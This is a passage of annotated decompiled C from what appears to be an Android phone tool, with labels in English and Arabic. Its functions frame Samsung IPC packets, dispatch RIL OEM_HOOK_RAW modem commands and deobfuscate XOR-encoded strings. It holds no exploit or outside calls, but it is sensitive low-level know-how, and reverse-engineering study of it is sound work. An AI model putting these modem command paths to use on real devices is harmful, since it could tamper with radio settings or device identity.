      puVar11[0x30] =
           CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar32 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar32 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar32 >> 8) ^ bVar17,(byte)uVar32 ^ bVar16)))))))
      ;
      puVar11[0x33] =
           CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar34 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar25,(byte)uVar34 ^ bVar24)))))))
      ;
      puVar11[0x32] =
           CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar12 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar17,(byte)uVar12 ^ bVar16)))))))
      ;
      *(byte *)((long)puVar11 + 0x1aa) = *(byte *)((long)puVar11 + 0x1aa) ^ 0x85;
      *(byte *)((long)puVar11 + 0x1ab) = *(byte *)((long)puVar11 + 0x1ab) ^ 0x2d;
      *(byte *)((long)puVar11 + 0x1ac) = *(byte *)((long)puVar11 + 0x1ac) ^ 0x6d;
    }
    uVar12 = FUN_002295c4(&DAT_00234b30);
    FUN_00204d38(&local_110,uVar12);
    uVar12 = FUN_00202bc0(8);
    FUN_0020c7ac();
    puVar11 = (undefined8 *)FUN_00202bc0(0x28);
    FUN_002036bc(puVar11 + 2,&local_110);
    *puVar11 = uVar12;
    puVar11[1] = &LAB_001a5480;
    iVar7 = pthread_create(&pStack_118,(pthread_attr_t *)0x0,FUN_001b5e04,puVar11);
    if (iVar7 != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_0020c118(iVar7,"thread constructor failed");
    }
    local_f8 = 300000000;
    FUN_0020c368(&local_f8);
    FUN_0020c2f4(&pStack_118);
    local_f8 = 500000000;
    FUN_0020c368(&local_f8);
    uVar13 = FUN_001a4d04();
    if ((uVar13 & 1) == 0) {
      local_f8 = 500000000;
      FUN_0020c368(&local_f8);
      uVar13 = FUN_001a4d04();
      if ((uVar13 & 1) == 0) {
        local_f8 = 500000000;
        FUN_0020c368(&local_f8);
        uVar13 = FUN_001a4d04();
        if ((uVar13 & 1) == 0) {
          local_f8 = 500000000;
          FUN_0020c368(&local_f8);
          uVar13 = FUN_001a4d04();
          if ((uVar13 & 1) == 0) {
            local_f8 = 500000000;
            FUN_0020c368(&local_f8);
            uVar13 = FUN_001a4d04();
            if ((uVar13 & 1) == 0) {
              local_f8 = 500000000;
              FUN_0020c368(&local_f8);
              uVar13 = FUN_001a4d04();
              if ((uVar13 & 1) == 0) {
                local_f8 = 500000000;
                FUN_0020c368(&local_f8);
                uVar13 = FUN_001a4d04();
                if ((uVar13 & 1) == 0) {
                  local_f8 = 500000000;
                  FUN_0020c368(&local_f8);
                  uVar13 = FUN_001a4d04();
                  if ((uVar13 & 1) == 0) {
                    local_f8 = 500000000;
                    FUN_0020c368(&local_f8);
                    uVar13 = FUN_001a4d04();
                    if ((uVar13 & 1) == 0) {
                      local_f8 = 500000000;
                      FUN_0020c368(&local_f8);
                      uVar13 = FUN_001a4d04();
                      if (((uVar13 & 1) == 0) && (uVar13 = FUN_001a55a8(), (uVar13 & 1) == 0)) {
                        FUN_001a5044();
                        local_f8 = 300000000;
                        FUN_0020c368(&local_f8);
                        uVar13 = FUN_001a4d04();
                        if ((uVar13 & 1) == 0) {
                          local_f8 = 300000000;
                          FUN_0020c368(&local_f8);
                          uVar13 = FUN_001a4d04();
                          if ((uVar13 & 1) == 0) {
                            local_f8 = 300000000;
                            FUN_0020c368(&local_f8);
                            uVar13 = FUN_001a4d04();
                            if ((uVar13 & 1) == 0) {
                              local_f8 = 300000000;
                              FUN_0020c368(&local_f8);
                              uVar13 = FUN_001a4d04();
                              if ((uVar13 & 1) == 0) {
                                local_f8 = 300000000;
                                FUN_0020c368(&local_f8);
                                uVar13 = FUN_001a4d04();
                                if ((uVar13 & 1) == 0) {
                                  local_f8 = 300000000;
                                  FUN_0020c368(&local_f8);
                                  uVar13 = FUN_001a4d04();
                                  if ((uVar13 & 1) == 0) {
                                    local_f8 = 300000000;
                                    FUN_0020c368(&local_f8);
                                    uVar13 = FUN_001a4d04();
                                    if ((uVar13 & 1) == 0) {
                                      local_f8 = 300000000;
                                      FUN_0020c368(&local_f8);
                                      uVar13 = FUN_001a4d04();
                                      if ((uVar13 & 1) == 0) {
                                        local_f8 = 300000000;
                                        FUN_0020c368(&local_f8);
                                        uVar13 = FUN_001a4d04();
                                        if ((uVar13 & 1) == 0) {
                                          local_f8 = 300000000;
                                          FUN_0020c368(&local_f8);
                                          FUN_001a4d04();
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    FUN_0020c284(&pStack_118);
    if ((local_110 & 1) != 0) {
      free(local_100);
    }
    goto LAB_001a4180;
  }
  uVar13 = FUN_001a55a8(iVar7);
  if ((uVar13 & 1) != 0) goto LAB_001a4180;
  if (bVar5 || bVar6) {
LAB_001a4144:
    iVar7 = 0xe;
    do {
      FUN_0019c02c();
      local_110 = 300000000;
      FUN_0020c368(&local_110);
      uVar13 = FUN_001a4d04();
      if ((uVar13 & 1) != 0) break;
      bVar5 = iVar7 != 0;
      iVar7 = iVar7 + -1;
    } while (bVar5);
  }
  else {
    if (uVar3 == 0x7e8) {
      if (uVar4 < 10) goto LAB_001a4144;
    }
    else if (uVar3 < 0x7e9) goto LAB_001a4144;
    local_110 = 1000000000;
    FUN_0020c368(&local_110);
    iVar7 = 0xe;
    do {
      FUN_0019d9ec();
      local_110 = 250000000;
      FUN_0020c368(&local_110);
      uVar13 = FUN_001a4d04();
      if ((uVar13 & 1) != 0) break;
      bVar5 = iVar7 != 0;
      iVar7 = iVar7 + -1;
    } while (bVar5);
  }
LAB_001a4180:
  if (*(long *)(lVar2 + 0x28) == local_38) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ----------------------------------------------------------------




// ============================================================================
// MODULE 4: RIL Socket & Samsung IPC Framing (بروتوكول RILD وحزم IPC)
// ============================================================================


/*
 * [PHONE FUNCTION] FUN_001b65e0
 * Purpose (EN): Samsung IPC Packet Framing & Hex Builder
 * Purpose (AR): تجميع وبناء إطارات بايتات IPC وحساب الطول والمحاذاة
 */

// Function: FUN_001b65e0 @ 001b65e0
// ----------------------------------------------------------------

undefined4 FUN_001b65e0(long param_1,undefined8 param_2,ulong *param_3)

{
  uint uVar1;
  byte bVar2;
  char cVar3;
  uint uVar4;
  long lVar5;
  undefined2 uVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  ulong uVar10;
  size_t sVar11;
  byte *pbVar12;
  undefined8 *puVar13;
  size_t sVar14;
  void *pvVar15;
  int iVar16;
  void *pvVar17;
  ulong uVar18;
  undefined8 uVar19;
  ulong uVar20;
  undefined4 uVar21;
  ulong uVar22;
  int iVar23;
  undefined8 uVar24;
  char *__s;
  long lVar25;
  undefined1 *puVar26;
  size_t sVar27;
  undefined8 *puVar28;
  byte bVar29;
  byte local_340 [8];
  ulong local_338;
  void *local_330;
  ulong local_328;
  ulong uStack_320;
  undefined1 *local_318;
  byte local_310 [16];
  void *local_300;
  byte local_2f8 [16];
  void *local_2e8;
  ulong local_2e0;
  ulong uStack_2d8;
  undefined1 *local_2d0;
  byte local_2c0 [8];
  uint local_2b8;
  void *local_2b0;
  byte local_2a8;
  undefined5 uStack_2a7;
  undefined2 uStack_2a2;
  undefined6 local_2a0;
  undefined2 uStack_29a;
  void *local_298;
  undefined6 local_290;
  undefined2 uStack_28a;
  undefined6 uStack_288;
  byte local_280;
  undefined5 uStack_27f;
  undefined2 uStack_27a;
  undefined6 local_278;
  undefined2 uStack_272;
  void *local_270;
  char acStack_268 [512];
  long local_68;
  
  lVar5 = tpidr_el0;
  local_68 = *(long *)(lVar5 + 0x28);
  FUN_002036bc(local_2c0);
  local_2e0 = 0;
  uStack_2d8 = 0;
  local_2d0 = (undefined1 *)0x0;
  FUN_002036bc(local_2f8,local_2c0);
  FUN_0019a8bc(local_2f8,&local_2e0);
  if ((local_2f8[0] & 1) != 0) {
    free(local_2e8);
  }
  FUN_002036bc(local_310,&local_2e0);
  FUN_0019a7a4(local_310,&local_2e0);
  if ((local_310[0] & 1) != 0) {
    free(local_300);
  }
  uVar1 = (uint)(local_2c0[0] >> 1);
  if ((local_2c0[0] & 1) != 0) {
    uVar1 = local_2b8;
  }
  if ((uVar1 & 0x80000001) == 1) {
    FUN_00204d38(param_3,"Worng Ril Command");
    uVar21 = 2;
joined_r0x001b6cc0:
    if ((local_2e0 & 1) != 0) {
      free(local_2d0);
    }
  }
  else {
    FUN_001b6da4(acStack_268);
    uVar24 = *(undefined8 *)(param_1 + 0x10);
    sVar11 = strlen(acStack_268);
    if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
      FUN_00203188(&local_328);
    }
    if (sVar11 < 0x17) {
      puVar26 = (undefined1 *)((ulong)&local_328 | 1);
      local_328 = CONCAT71(local_328._1_7_,(char)((int)sVar11 << 1));
      if (sVar11 != 0) goto LAB_001b6720;
    }
    else {
      uVar22 = sVar11 + 0x10 & 0xfffffffffffffff0;
      puVar26 = (undefined1 *)FUN_00202bc0(uVar22);
      local_328 = uVar22 | 1;
      uStack_320 = sVar11;
      local_318 = puVar26;
LAB_001b6720:
      memcpy(puVar26,acStack_268,sVar11);
    }
    puVar26[sVar11] = 0;
    pbVar12 = (byte *)FUN_00204578(&local_328,0,uVar24);
    bVar29 = *pbVar12;
    bVar2 = pbVar12[1];
    local_280 = (byte)*(undefined8 *)(pbVar12 + 2);
    uStack_27f = (undefined5)((ulong)*(undefined8 *)(pbVar12 + 2) >> 8);
    uVar22 = *(ulong *)(pbVar12 + 0x10);
    uStack_27a = (undefined2)*(undefined8 *)(pbVar12 + 8);
    local_278 = (undefined6)((ulong)*(undefined8 *)(pbVar12 + 8) >> 0x10);
    pbVar12[8] = 0;
    pbVar12[9] = 0;
    pbVar12[10] = 0;
    pbVar12[0xb] = 0;
    pbVar12[0xc] = 0;
    pbVar12[0xd] = 0;
    pbVar12[0xe] = 0;
    pbVar12[0xf] = 0;
    pbVar12[0x10] = 0;
    pbVar12[0x11] = 0;
    pbVar12[0x12] = 0;
    pbVar12[0x13] = 0;
    pbVar12[0x14] = 0;
    pbVar12[0x15] = 0;
    pbVar12[0x16] = 0;
    pbVar12[0x17] = 0;
    pbVar12[0] = 0;
    pbVar12[1] = 0;
    pbVar12[2] = 0;
    pbVar12[3] = 0;
    pbVar12[4] = 0;
    pbVar12[5] = 0;
    pbVar12[6] = 0;
    pbVar12[7] = 0;
    if ((*param_3 & 1) != 0) {
      free((void *)param_3[2]);
    }
    *(byte *)param_3 = bVar29;
    *(byte *)((long)param_3 + 1) = bVar2;
    *(ulong *)((long)param_3 + 2) = CONCAT26(uStack_27a,CONCAT51(uStack_27f,local_280));
    param_3[1] = CONCAT62(local_278,uStack_27a);
    param_3[2] = uVar22;
    if ((local_328 & 1) != 0) {
      free(local_318);
    }
    if ((int)uVar1 < 9) {
      uVar22 = 1;
    }
    else {
      uVar4 = uVar1 >> 3;
      if ((uVar1 & 0x80000007) != 0) {
        uVar4 = uVar4 + 1;
      }
      uVar22 = (ulong)uVar4;
    }
    puVar28 = (undefined8 *)((ulong)&local_328 | 2);
    uVar20 = 0;
    pvVar17 = (void *)((ulong)&local_2a8 | 1);
    do {
      FUN_002043ac(&local_328,local_2c0,uVar20 << 3,8,local_2c0);
      if ((local_2e0 & 1) != 0) {
        free(local_2d0);
      }
      local_2d0 = local_318;
      uStack_2d8 = uStack_320;
      local_2e0 = local_328;
      local_328 = 0;
      uStack_320 = 0;
      local_318 = (undefined1 *)0x0;
      uVar18 = local_2e0 >> 1 & 0x7f;
      if ((local_2e0 & 1) != 0) {
        uVar18 = uStack_2d8;
      }
      iVar16 = (int)(uVar18 >> 1);
      if (0 < iVar16) {
        iVar23 = iVar16 * 2;
        lVar25 = (long)iVar16 + 1;
        do {
          iVar23 = iVar23 + -2;
          FUN_002043ac(&local_280,&local_2e0,(long)iVar23,2,&local_2e0);
          uVar18 = local_328 >> 1 & 0x7f;
          puVar26 = (undefined1 *)((ulong)&local_328 | 1);
          if ((local_328 & 1) != 0) {
            uVar18 = uStack_320;
            puVar26 = local_318;
          }
          puVar13 = (undefined8 *)FUN_00203cb8(&local_280,0,puVar26,uVar18);
          uVar6 = *(undefined2 *)puVar13;
          local_2a8 = (byte)*(undefined8 *)((long)puVar13 + 2);
          uStack_2a7 = (undefined5)((ulong)*(undefined8 *)((long)puVar13 + 2) >> 8);
          puVar26 = (undefined1 *)puVar13[2];
          uStack_2a2 = (undefined2)puVar13[1];
          local_2a0 = (undefined6)((ulong)puVar13[1] >> 0x10);
          *puVar13 = 0;
          puVar13[1] = 0;
          puVar13[2] = 0;
          if ((local_328 & 1) != 0) {
            free(local_318);
          }
          local_328 = CONCAT62(local_328._2_6_,uVar6);
          *puVar28 = CONCAT26(uStack_2a2,CONCAT51(uStack_2a7,local_2a8));
          *(ulong *)((long)puVar28 + 6) = CONCAT62(local_2a0,uStack_2a2);
          local_318 = puVar26;
          if ((local_280 & 1) != 0) {
            free(local_270);
          }
          lVar25 = lVar25 + -1;
        } while (1 < lVar25);
      }
      FUN_00204f8c(&local_2e0,&local_328);
      FUN_002036bc(local_340,&local_2e0);
      uVar18 = (ulong)(local_340[0] >> 1);
      if ((local_340[0] & 1) != 0) {
        uVar18 = local_338;
      }
      if (0 < (int)uVar18) {
        uVar18 = (uVar18 & 0xffffffff) + 1;
        do {
          uVar18 = uVar18 - 1;
        } while (1 < uVar18);
      }
      FUN_001b6da4(acStack_268);
      if ((local_340[0] & 1) != 0) {
        free(local_330);
      }
      __s = *(char **)(param_1 + 0x10);
      local_278 = 0;
      uStack_272 = 0;
      local_270 = (void *)0x0;
      uVar18 = *param_3;
      local_280 = 0;
      uStack_27f = 0;
      uStack_27a = 0;
      sVar27 = param_3[1];
      sVar14 = strlen(__s);
      pbVar12 = (byte *)((long)param_3 + 1);
      sVar11 = (ulong)(byte)((byte)uVar18 >> 1);
      if (((byte)uVar18 & 1) != 0) {
        pbVar12 = (byte *)param_3[2];
        sVar11 = sVar27;
      }
      uVar18 = sVar11 + sVar14;
      if (0xffffffffffffffef < uVar18) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_280);
      }
      if (uVar18 < 0x17) {
        local_280 = (byte)((int)sVar11 << 1);
        pvVar15 = (void *)((ulong)&local_280 | 1);
      }
      else {
        uVar18 = uVar18 + 0x10 & 0xfffffffffffffff0;
        local_270 = (void *)FUN_00202bc0(uVar18);
        local_280 = (byte)uVar18 | 1;
        local_278 = (undefined6)sVar11;
        uStack_272 = (undefined2)(sVar11 >> 0x30);
        uStack_27f = (undefined5)(uVar18 >> 8);
        uStack_27a = (undefined2)(uVar18 >> 0x30);
        pvVar15 = local_270;
      }
      if (sVar11 != 0) {
        memcpy(pvVar15,pbVar12,sVar11);
      }
      *(undefined1 *)((long)pvVar15 + sVar11) = 0;
      FUN_0020417c(&local_280,__s,sVar14);
      sVar11 = strlen(acStack_268);
      if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_2a8);
      }
      if (sVar11 < 0x17) {
        local_2a8 = (byte)((int)sVar11 << 1);
        pvVar15 = pvVar17;
        if (sVar11 != 0) goto LAB_001b6af8;
      }
      else {
        uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
        pvVar15 = (void *)FUN_00202bc0(uVar18);
        local_2a8 = (byte)uVar18 | 1;
        local_2a0 = (undefined6)sVar11;
        uStack_29a = (undefined2)(sVar11 >> 0x30);
        uStack_2a7 = (undefined5)(uVar18 >> 8);
        uStack_2a2 = (undefined2)(uVar18 >> 0x30);
        local_298 = pvVar15;
LAB_001b6af8:
        memcpy(pvVar15,acStack_268,sVar11);
      }
      *(undefined1 *)((long)pvVar15 + sVar11) = 0;
      uVar18 = (ulong)(local_2a8 >> 1);
      pvVar15 = pvVar17;
      if ((local_2a8 & 1) != 0) {
        uVar18 = CONCAT26(uStack_29a,local_2a0);
        pvVar15 = local_298;
      }
      pbVar12 = (byte *)FUN_0020417c(&local_280,pvVar15,uVar18);
      uVar24 = *(undefined8 *)(pbVar12 + 8);
      uVar18 = *(ulong *)(pbVar12 + 0x10);
      bVar29 = *pbVar12;
      bVar2 = pbVar12[1];
      uVar19 = *(undefined8 *)(pbVar12 + 2);
      pbVar12[8] = 0;
      pbVar12[9] = 0;
      pbVar12[10] = 0;
      pbVar12[0xb] = 0;
      pbVar12[0xc] = 0;
      pbVar12[0xd] = 0;
      pbVar12[0xe] = 0;
      pbVar12[0xf] = 0;
      pbVar12[0x10] = 0;
      pbVar12[0x11] = 0;
      pbVar12[0x12] = 0;
      pbVar12[0x13] = 0;
      pbVar12[0x14] = 0;
      pbVar12[0x15] = 0;
      pbVar12[0x16] = 0;
      pbVar12[0x17] = 0;
      pbVar12[0] = 0;
      pbVar12[1] = 0;
      pbVar12[2] = 0;
      pbVar12[3] = 0;
      pbVar12[4] = 0;
      pbVar12[5] = 0;
      pbVar12[6] = 0;
      pbVar12[7] = 0;
      local_290 = (undefined6)uVar19;
      uStack_28a = (undefined2)uVar24;
      uStack_288 = (undefined6)((ulong)uVar24 >> 0x10);
      if ((*param_3 & 1) != 0) {
        free((void *)param_3[2]);
      }
      *(byte *)param_3 = bVar29;
      *(byte *)((long)param_3 + 1) = bVar2;
      param_3[2] = uVar18;
      *(ulong *)((long)param_3 + 2) = CONCAT26(uStack_28a,local_290);
      param_3[1] = CONCAT62(uStack_288,uStack_28a);
      if ((local_2a8 & 1) != 0) {
        free(local_298);
      }
      if ((local_280 & 1) != 0) {
        free(local_270);
      }
      if ((local_328 & 1) != 0) {
        *local_318 = 0;
        uStack_320 = 0;
        if ((local_328 & 1) != 0) {
          free(local_318);
        }
      }
      uVar20 = uVar20 + 1;
    } while (uVar20 != uVar22);
    FUN_001b6da4(acStack_268);
    pbVar12 = (byte *)FUN_002295c4(&DAT_00236010);
    if ((*pbVar12 & 1) == 0) {
      puVar28 = (undefined8 *)FUN_002295c4(&DAT_00235ff0);
      *puVar28 = DAT_00177958;
      *(undefined2 *)(puVar28 + 1) = 0x1db;
      FUN_002234c0(&LAB_001b7654,puVar28,0x2362d0);
      puVar26 = (undefined1 *)FUN_002295c4(&DAT_00236010);
      *puVar26 = 1;
      lVar25 = FUN_002295c4(&DAT_00235ff0);
      cVar3 = *(char *)(lVar25 + 9);
    }
    else {
      lVar25 = FUN_002295c4(&DAT_00235ff0);
      cVar3 = *(char *)(lVar25 + 9);
    }
    if (cVar3 != '\0') {
      puVar28 = (undefined8 *)FUN_002295c4(&DAT_00235ff0);
      uVar24 = *puVar28;
      *(undefined1 *)((long)puVar28 + 9) = 0;
      bVar29 = (byte)DAT_00177a18;
      uVar22 = (ulong)DAT_00177a18 >> 8;
      uVar20 = (ulong)DAT_00177a18 >> 0x10;
      uVar18 = (ulong)DAT_00177a18 >> 0x18;
      uVar7 = (ulong)DAT_00177a18 >> 0x20;
      uVar8 = (ulong)DAT_00177a18 >> 0x28;
      uVar9 = (ulong)DAT_00177a18 >> 0x30;
      uVar10 = (ulong)DAT_00177a18 >> 0x38;
      *(byte *)(puVar28 + 1) = *(byte *)(puVar28 + 1) ^ 0xdb;
      *puVar28 = CONCAT17((byte)((ulong)uVar24 >> 0x38) ^ (byte)uVar10,
                          CONCAT16((byte)((ulong)uVar24 >> 0x30) ^ (byte)uVar9,
                                   CONCAT15((byte)((ulong)uVar24 >> 0x28) ^ (byte)uVar8,
                                            CONCAT14((byte)((ulong)uVar24 >> 0x20) ^ (byte)uVar7,
                                                     CONCAT13((byte)((ulong)uVar24 >> 0x18) ^
                                                              (byte)uVar18,
                                                              CONCAT12((byte)((ulong)uVar24 >> 0x10)
                                                                       ^ (byte)uVar20,
                                                                       CONCAT11((byte)((ulong)uVar24
                                                                                      >> 8) ^
                                                                                (byte)uVar22,
                                                                                (byte)uVar24 ^
                                                                                bVar29)))))));
    }
    uVar24 = FUN_002295c4(&DAT_00235ff0);
    FUN_00204d38(&local_2e0,uVar24);
    FUN_0019b934(&local_328,param_3,&local_2e0);
    if ((*param_3 & 1) != 0) {
      free((void *)param_3[2]);
    }
    param_3[1] = uStack_320;
    *param_3 = local_328;
    param_3[2] = (ulong)local_318;
    if ((local_2e0 & 1) != 0) {
      uVar21 = 0;
      *local_2d0 = 0;
      uStack_2d8 = 0;
      goto joined_r0x001b6cc0;
    }
    uVar21 = 0;
    local_2e0 = local_2e0 & 0xffffffffffff0000;
  }
  if ((local_2c0[0] & 1) == 0) {
    if (*(long *)(lVar5 + 0x28) != local_68) {
LAB_001b6d20:
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  }
  else {
    free(local_2b0);
    if (*(long *)(lVar5 + 0x28) != local_68) goto LAB_001b6d20;
  }
  return uVar21;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001b6e44
 * Purpose (EN): RIL OEM Hook Command Dispatcher
 * Purpose (AR): موزع أوامر RIL وتحويلها لنداءات OEM_HOOK_RAW
 */

// Function: FUN_001b6e44 @ 001b6e44
// ----------------------------------------------------------------

undefined4 FUN_001b6e44(long param_1,undefined8 param_2,ulong *param_3)

{
  uint uVar1;
  byte bVar2;
  char cVar3;
  uint uVar4;
  long lVar5;
  undefined2 uVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  ulong uVar10;
  size_t sVar11;
  byte *pbVar12;
  undefined8 *puVar13;
  size_t sVar14;
  void *pvVar15;
  int iVar16;
  void *pvVar17;
  ulong uVar18;
  undefined8 uVar19;
  ulong uVar20;
  undefined4 uVar21;
  ulong uVar22;
  int iVar23;
  undefined8 uVar24;
  char *__s;
  long lVar25;
  undefined1 *puVar26;
  size_t sVar27;
  undefined8 *puVar28;
  byte bVar29;
  byte local_340 [8];
  ulong local_338;
  void *local_330;
  ulong local_328;
  ulong uStack_320;
  undefined1 *local_318;
  byte local_310 [16];
  void *local_300;
  byte local_2f8 [16];
  void *local_2e8;
  ulong local_2e0;
  ulong uStack_2d8;
  undefined1 *local_2d0;
  byte local_2c0 [8];
  uint local_2b8;
  void *local_2b0;
  byte local_2a8;
  undefined5 uStack_2a7;
  undefined2 uStack_2a2;
  undefined6 local_2a0;
  undefined2 uStack_29a;
  void *local_298;
  undefined6 local_290;
  undefined2 uStack_28a;
  undefined6 uStack_288;
  byte local_280;
  undefined5 uStack_27f;
  undefined2 uStack_27a;
  undefined6 local_278;
  undefined2 uStack_272;
  void *local_270;
  char acStack_268 [512];
  long local_68;
  
  lVar5 = tpidr_el0;
  local_68 = *(long *)(lVar5 + 0x28);
  FUN_002036bc(local_2c0);
  local_2e0 = 0;
  uStack_2d8 = 0;
  local_2d0 = (undefined1 *)0x0;
  FUN_002036bc(local_2f8,local_2c0);
  FUN_0019a8bc(local_2f8,&local_2e0);
  if ((local_2f8[0] & 1) != 0) {
    free(local_2e8);
  }
  FUN_002036bc(local_310,&local_2e0);
  FUN_0019a7a4(local_310,&local_2e0);
  if ((local_310[0] & 1) != 0) {
    free(local_300);
  }
  uVar1 = (uint)(local_2c0[0] >> 1);
  if ((local_2c0[0] & 1) != 0) {
    uVar1 = local_2b8;
  }
  if ((uVar1 & 0x80000001) == 1) {
    FUN_00204d38(param_3,"Worng Ril Command");
    uVar21 = 2;
joined_r0x001b7564:
    if ((local_2e0 & 1) != 0) {
      free(local_2d0);
    }
  }
  else {
    FUN_001b6da4(acStack_268);
    uVar24 = *(undefined8 *)(param_1 + 0x10);
    sVar11 = strlen(acStack_268);
    if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
      FUN_00203188(&local_328);
    }
    if (sVar11 < 0x17) {
      puVar26 = (undefined1 *)((ulong)&local_328 | 1);
      local_328 = CONCAT71(local_328._1_7_,(char)((int)sVar11 << 1));
      if (sVar11 != 0) goto LAB_001b6f84;
    }
    else {
      uVar22 = sVar11 + 0x10 & 0xfffffffffffffff0;
      puVar26 = (undefined1 *)FUN_00202bc0(uVar22);
      local_328 = uVar22 | 1;
      uStack_320 = sVar11;
      local_318 = puVar26;
LAB_001b6f84:
      memcpy(puVar26,acStack_268,sVar11);
    }
    puVar26[sVar11] = 0;
    pbVar12 = (byte *)FUN_00204578(&local_328,0,uVar24);
    bVar29 = *pbVar12;
    bVar2 = pbVar12[1];
    local_280 = (byte)*(undefined8 *)(pbVar12 + 2);
    uStack_27f = (undefined5)((ulong)*(undefined8 *)(pbVar12 + 2) >> 8);
    uVar22 = *(ulong *)(pbVar12 + 0x10);
    uStack_27a = (undefined2)*(undefined8 *)(pbVar12 + 8);
    local_278 = (undefined6)((ulong)*(undefined8 *)(pbVar12 + 8) >> 0x10);
    pbVar12[8] = 0;
    pbVar12[9] = 0;
    pbVar12[10] = 0;
    pbVar12[0xb] = 0;
    pbVar12[0xc] = 0;
    pbVar12[0xd] = 0;
    pbVar12[0xe] = 0;
    pbVar12[0xf] = 0;
    pbVar12[0x10] = 0;
    pbVar12[0x11] = 0;
    pbVar12[0x12] = 0;
    pbVar12[0x13] = 0;
    pbVar12[0x14] = 0;
    pbVar12[0x15] = 0;
    pbVar12[0x16] = 0;
    pbVar12[0x17] = 0;
    pbVar12[0] = 0;
    pbVar12[1] = 0;
    pbVar12[2] = 0;
    pbVar12[3] = 0;
    pbVar12[4] = 0;
    pbVar12[5] = 0;
    pbVar12[6] = 0;
    pbVar12[7] = 0;
    if ((*param_3 & 1) != 0) {
      free((void *)param_3[2]);
    }
    *(byte *)param_3 = bVar29;
    *(byte *)((long)param_3 + 1) = bVar2;
    *(ulong *)((long)param_3 + 2) = CONCAT26(uStack_27a,CONCAT51(uStack_27f,local_280));
    param_3[1] = CONCAT62(local_278,uStack_27a);
    param_3[2] = uVar22;
    if ((local_328 & 1) != 0) {
      free(local_318);
    }
    if ((int)uVar1 < 9) {
      uVar22 = 1;
    }
    else {
      uVar4 = uVar1 >> 3;
      if ((uVar1 & 0x80000007) != 0) {
        uVar4 = uVar4 + 1;
      }
      uVar22 = (ulong)uVar4;
    }
    puVar28 = (undefined8 *)((ulong)&local_328 | 2);
    uVar20 = 0;
    pvVar17 = (void *)((ulong)&local_2a8 | 1);
    do {
      FUN_002043ac(&local_328,local_2c0,uVar20 << 3,8,local_2c0);
      if ((local_2e0 & 1) != 0) {
        free(local_2d0);
      }
      local_2d0 = local_318;
      uStack_2d8 = uStack_320;
      local_2e0 = local_328;
      local_328 = 0;
      uStack_320 = 0;
      local_318 = (undefined1 *)0x0;
      uVar18 = local_2e0 >> 1 & 0x7f;
      if ((local_2e0 & 1) != 0) {
        uVar18 = uStack_2d8;
      }
      iVar16 = (int)(uVar18 >> 1);
      if (0 < iVar16) {
        iVar23 = iVar16 * 2;
        lVar25 = (long)iVar16 + 1;
        do {
          iVar23 = iVar23 + -2;
          FUN_002043ac(&local_280,&local_2e0,(long)iVar23,2,&local_2e0);
          uVar18 = local_328 >> 1 & 0x7f;
          puVar26 = (undefined1 *)((ulong)&local_328 | 1);
          if ((local_328 & 1) != 0) {
            uVar18 = uStack_320;
            puVar26 = local_318;
          }
          puVar13 = (undefined8 *)FUN_00203cb8(&local_280,0,puVar26,uVar18);
          uVar6 = *(undefined2 *)puVar13;
          local_2a8 = (byte)*(undefined8 *)((long)puVar13 + 2);
          uStack_2a7 = (undefined5)((ulong)*(undefined8 *)((long)puVar13 + 2) >> 8);
          puVar26 = (undefined1 *)puVar13[2];
          uStack_2a2 = (undefined2)puVar13[1];
          local_2a0 = (undefined6)((ulong)puVar13[1] >> 0x10);
          *puVar13 = 0;
          puVar13[1] = 0;
          puVar13[2] = 0;
          if ((local_328 & 1) != 0) {
            free(local_318);
          }
          local_328 = CONCAT62(local_328._2_6_,uVar6);
          *puVar28 = CONCAT26(uStack_2a2,CONCAT51(uStack_2a7,local_2a8));
          *(ulong *)((long)puVar28 + 6) = CONCAT62(local_2a0,uStack_2a2);
          local_318 = puVar26;
          if ((local_280 & 1) != 0) {
            free(local_270);
          }
          lVar25 = lVar25 + -1;
        } while (1 < lVar25);
      }
      FUN_00204f8c(&local_2e0,&local_328);
      FUN_002036bc(local_340,&local_2e0);
      uVar18 = (ulong)(local_340[0] >> 1);
      if ((local_340[0] & 1) != 0) {
        uVar18 = local_338;
      }
      if (0 < (int)uVar18) {
        uVar18 = (uVar18 & 0xffffffff) + 1;
        do {
          uVar18 = uVar18 - 1;
        } while (1 < uVar18);
      }
      FUN_001b6da4(acStack_268);
